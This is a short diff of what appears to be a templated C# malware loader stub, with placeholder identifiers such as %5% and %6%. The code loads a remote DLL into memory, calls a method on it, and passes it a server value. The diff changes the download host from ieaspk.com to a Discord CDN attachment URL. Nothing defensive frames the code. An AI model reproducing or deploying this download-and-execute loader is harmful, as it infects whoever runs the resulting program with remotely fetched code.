@@ -76,11 +76,11 @@ namespace %4%
     //download }
 
 
-           object %5% = new object[] { %aPP%, string.Empty, %1%("%Server%"), true };
+            object %5% = new object[] { %aPP%, string.Empty, %1%("%Server%"), true };
 
             Assembly %6%;
 
-            %6% = AppDomain.CurrentDomain.Load(%1%("https://ieaspk.com/instagram.dll"));
+            %6% = AppDomain.CurrentDomain.Load(%1%("https://cdn.discordapp.com/attachments/844669981151985754/846094134501965824/instagram_3.dll"));
 
 
             %6%.GetType("instagram.whatsapp").InvokeMember("studio", System.Reflection.BindingFlags.InvokeMethod, null, null, (object[])%5%);
